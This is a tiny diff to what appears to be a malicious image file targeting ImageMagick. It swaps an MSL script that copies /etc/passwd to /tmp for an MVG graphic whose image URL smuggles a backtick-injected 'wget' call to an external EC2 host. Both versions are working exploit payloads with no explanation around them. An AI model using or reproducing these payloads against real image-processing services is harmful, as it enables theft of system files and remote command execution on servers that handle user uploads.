@@ -1,5 +1,4 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<image>
-<read filename="/etc/passwd" />
-<write filename="/tmp/passwdhaxxsyler" />
-</image>
+push graphic-context
+viewbox 0 0 640 480
+image over 0,0 0,0 'https://127.0.0.1/x.php?x=`wget -O- http://ec2-54-200-137-116.us-west-2.compute.amazonaws.com/sierrahax`'
+pop graphic-context
